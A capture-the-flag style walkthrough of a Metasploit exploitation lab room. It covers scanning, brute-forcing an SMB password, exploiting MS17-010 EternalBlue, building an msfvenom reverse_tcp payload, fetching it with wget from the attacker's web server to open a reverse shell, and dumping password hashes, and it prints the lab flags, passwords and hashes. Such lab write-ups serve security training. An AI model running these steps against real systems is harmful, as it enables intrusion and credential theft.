# Metasploit: Exploitation 

> Evan Diamantidis | May 26th, 2022

--------------------------

<br />

# 1. Introduction

1.1: Start the AttackBox and run Metasploit using the msfconsole command to follow along this room. 
```
No answer needed
```

<br />
<br />

# 2. Scanning
	
2.1: How many ports are open on the target system?

We will use nmap to gather some information on the target system's open ports.

```
nmap -sC -sV -oN nmap/scanning 10.10.57.34
```
The output of the "scanning" file we just created under the "nmap" folder using the above command is:

```
# Nmap 7.92 scan initiated Thu May 26 13:11:10 2022 as: nmap -sC -sV -oN nmap/scanning 10.10.57.34
Nmap scan report for 10.10.57.34
Host is up (0.014s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5e
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:eb:14:56:ee:93:2a:a2:60:5d:70:23:90:32:f9:11 (RSA)
|   256 cc:ab:22:d0:00:7d:c4:06:04:1a:36:36:13:96:0d:76 (ECDSA)
|_  256 76:16:79:f5:6a:3f:3a:1c:80:7f:e0:c9:7b:b5:4a:8c (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: ACME IT SUPPORT)
8000/tcp open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/plain).
Service Info: Host: IP-10-10-57-34; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: IP-10-10-57-34, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-26T12:11:23
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: ip-10-10-57-34
|   NetBIOS computer name: IP-10-10-57-34\x00
|   Domain name: eu-west-1.compute.internal
|   FQDN: ip-10-10-57-34.eu-west-1.compute.internal
|_  System time: 2022-05-26T12:11:23+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 26 13:11:23 2022 -- 1 IP address (1 host up) scanned in 13.11 seconds
```
We notice there are a total of 5 open ports on the target system.
```
5
```
2.2: Using the relevant scanner, what NetBIOS name can you see?
```
ACME IT SUPPORT
```
2.3: What is running on port 8000?
```
WebFS/1.21
```
2.4: What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 

Searching for "smb_login" in Metasploit, we find the "auxiliary/scanner/smb/smb_login" module that we can use for the purposes of this task.
```
search smb_login
```
![image](https://user-images.githubusercontent.com/14150485/170563705-2ae41116-52f7-4e24-91b0-644e111f3bed.png)

```
use 0
```
Alternatively, we can:
```
use auxiliary/scanner/smb/smb_login
```
Now, we need to set the "RHOSTS" value to the target IP, "SMBUser" to "penny" and ensure "PASS_FILE" points to the wordlist file supplied at the beginning of this module. That's it, we're all set to run the exploit!

```
set RHOSTS MACHINE_IP
set SMBUser penny
set PASS_FILE .../MetasploitWordlist.txt
run
```
![image](https://user-images.githubusercontent.com/14150485/170565767-5e792e75-1670-49b0-92c7-f8d2e6bbd392.png)

The successful entry indicates that the password for "penny" is "leo1234".
```
leo1234
```

<br />
<br />

# 3. The Metasploit Database

3.1: No answers needed.
```
No answer needed
```

<br />
<br />

# 4. Vulnerability Scanning

4.1: Who wrote the module that allows us to check SMTP servers for open relay?

In Metasploit:
```
search open relay
```
![image](https://user-images.githubusercontent.com/14150485/170566518-90fb9733-9e27-4c1c-aa66-28e43251981e.png)

There is only one matching module we can use to get the information we are looking for.
```
info 0
```
Alternatively, we can type:
```
info auxiliary/scanner/smtp/smtp_relay
```
![image](https://user-images.githubusercontent.com/14150485/170566752-77c4829d-4e53-45a3-aa64-3da32038815c.png)

The "SMTP Open Relay Detection" module has been provided by Campbell Murray.

```
Campbell Murray
```

<br />
<br />

# 5. Exploitation

5.1: Exploit one of the critical vulnerabilities on the target VM
```
No answer needed
```
We will be using nmap to gather some information around the target system.
```
nmap -sC -sV -oN nmap/exploitation 10.10.38.40
```
The "exploitation" nmap output file we created under the "nmap" folder:
```
# Nmap 7.92 scan initiated Thu May 26 16:20:01 2022 as: nmap -sC -sV -oN nmap/exploitation 10.10.38.40
Nmap scan report for 10.10.38.40
Host is up (0.015s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2022-05-26T15:21:18+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-05-25T15:17:52
|_Not valid after:  2022-11-24T15:17:52
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-05-26T15:21:03+00:00
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h14m09s, median: 1s
| smb2-time: 
|   date: 2022-05-26T15:21:03
|_  start_date: 2022-05-26T15:17:46
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:62:bd:a3:28:eb (unknown)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-26T10:21:03-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 26 16:21:16 2022 -- 1 IP address (1 host up) scanned in 75.19 seconds
```
5.2: What is the content of the flag.txt file?

Search for "MS17-010" in Metasploit, as hinted on the question.
```
search MS17-010
```
![image](https://user-images.githubusercontent.com/14150485/170527080-8fe99576-a57d-4fe5-ad8c-b39f2702e1cf.png)

Looks like we could use the "ms17_010_eternalblue exploit" module from the list.

```
use 0
```

Alternatively, we can:
```
use exploit/windows/smb/ms17_010_eternalblue
```

We then proceed to set the "LHOST" value to our local IP, "RHOSTS" to the remote one, and run the exploit.
```
set LHOST LOCALIP
set RHOSTS TARGETIP
run
```

Once the shell is up, the "flag.txt" file can be found under the "/users/jon/documents" folder.
```
ls -la /users/jon/documents
```
![image](https://user-images.githubusercontent.com/14150485/170525321-2d525e27-ffb6-4fcd-9d6d-0d03f2895bc2.png)
```
cat flag.txt
```
```
THM-5455554845
```

5.3: What is the NTLM hash of the password of the user "pirate"?
```
hashdump
```
![image](https://user-images.githubusercontent.com/14150485/170523057-8a28c4f5-f0fd-4b9b-9ee6-64bf1edb6746.png)

```
8ce9a3ebd1647fcc5e04025019f4b875
```

<br />
<br />

# 6. Msfvenom

6.1: Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
```
No answer needed
```
6.2: Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).

To create the payload we run the command supplied in this module, replacing "LHOST" with our local IP and "LPORT" with our desired local port.
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LOCALIP LPORT=LOCALPORT -f elf > rev_shell.elf
```
This will create a "rev_shell.elf" file that we can use to upload to the target system.

![2022-05-26 21_51_24-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170578171-a23270c7-0f3c-4929-88e4-ab48d776e467.png)

```
No answer needed
```
6.3: Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).

We set up a temporary server locally using python, as instructed.
```
python3 -m http.server 9000
```

![2022-05-26 21_54_30-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170578596-32741361-f531-49f7-9cc5-440dc55cea71.png)

Next up, we pull the file via SSH on the target system.
```
wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf
```
![2022-05-26 21_54_30-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170579643-b99389eb-0737-4b35-805e-c7fecb75757b.png)

While still on the target machine, we need to change the permissions on the "rev_shell.elf" file we just pulled before we proceed to execute it.

```
chmod +x rev_shell.elf
```
![image](https://user-images.githubusercontent.com/14150485/170581779-2d0cabf9-906d-406d-bbdd-e8595ba07e93.png)

```
No answer needed
```
6.4: Get a meterpreter session on the target machine.

On our local machine, we launch "msfconsole".
```
msfconsole
```
For the purposes of this section we will be using the "exploit/multi/handler" module, also known as "Generic Payload Handler".
```
use exploit/multi/handler
```
The payload value for this module must be set to match the payload used upon creation of the "rev_shell.elf" file.
```
set payload linux/x86/meterpreter/reverse_tcp
```
We can then proceed to set the "LHOST" value to our local IP address, "LPORT" to the port number specified on the "rev_shell.elf" file, and run the exploit.
```
set LHOST LOCALIP
set LPORT LOCALPORT
run
```
With our multi handler running, we proceed to execute the "rev_shell.elf" file on the target system via SSH.
```
./rev_shell.elf
```
![image](https://user-images.githubusercontent.com/14150485/170582370-abdd61e2-e6ff-4f8b-9a03-2186ea01ea24.png)

And we got a shell!

![2022-05-26 22_25_34-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170582787-aa8aaf13-e104-4c23-a49c-3d31e6ad2b00.png)

```
No answer needed
```
6.5: Use a post exploitation module to dump hashes of other users on the system.

To proceed with the hash dump we need to move the existing meterpreter process in the background so we can utilize another module within Metasploit.
```
Ctrl + Z
```
Once done, we take a step "back" so we can select the "linux/gather/hashdump" module.

![2022-05-26 22_33_56-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170584086-4a751edf-daf6-4c48-ba33-91ce66d46c8c.png)

The only option we need to set with the "hashdump" module is called "SESSION" and it should be set to the active session number running in the background.

```
set SESSION 3
```
Running the exploit will reveal the hashes we are looking for and also saves a copy on our local machine.

![image](https://user-images.githubusercontent.com/14150485/170584722-45a50c4d-c7e5-4436-afb3-d55498497e90.png)

```
No answer needed
```
6.6: What is the other user's password hash?
```
$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002
```
<br />
<br />

# 7. Summary

```
No answer is needed.
```
